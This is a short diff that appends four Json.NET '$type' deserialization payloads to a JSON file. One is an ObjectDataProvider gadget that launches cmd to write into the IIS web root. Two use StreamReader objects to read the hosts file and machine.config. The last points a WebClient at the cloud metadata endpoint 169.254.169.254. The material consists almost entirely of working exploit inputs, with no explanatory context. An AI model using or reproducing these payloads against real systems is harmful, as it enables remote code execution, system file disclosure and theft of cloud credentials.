@@ -90,3 +90,61 @@
     }
   }
 ]
+
+
+
+From here ----------
+
+
+{
+  "$type":"System.IO.StreamReader, mscorlib",
+  "path":"C:\\Windows\\System32\\drivers\\etc\\hosts"
+}
+
+
+
+
+
+
+
+{
+  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$type": "System.Collections.ArrayList, mscorlib",
+    "$values": [
+      "cmd",
+      "/c echo HACKED > C:\\inetpub\\wwwroot\\test.txt"
+    ]
+  },
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System"
+  }
+}
+
+
+
+
+
+
+{
+  "$type":"System.IO.StreamReader, mscorlib",
+  "path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config"
+}
+
+
+
+
+
+
+{
+  "$type": "System.Net.WebClient, System",
+  "BaseAddress": "http://169.254.169.254/latest/meta-data/",
+  "Proxy": null
+}
+
+
+
+
+
+
